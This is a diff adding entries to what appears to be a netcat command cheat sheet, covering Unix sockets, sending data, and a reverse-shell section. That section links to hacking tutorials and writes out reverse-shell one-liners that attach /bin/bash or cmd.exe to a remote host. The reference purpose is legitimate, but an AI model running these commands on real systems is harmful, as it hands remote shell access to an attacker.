@@ -37,3 +37,19 @@
 - Proxy and port forwarding:
 
 `nc -l {{port}} | nc {{hostname}} {{port}}`
+- Open a listening socket
+
+`nc -lU socket.sock`
+`echo mytext | nc -U socket.sock`
+
+- Send data 
+
+`nc -l {port}`
+`echo "test" | nc {host} {port} `
+
+- Reverse shell
+`https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/`
+`http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`
+`nc -lvp {port}`
+`linux: nc {host} {port} -e /bin/bash`
+`windows: nc.exe {host} {port} -e cmd.exe`
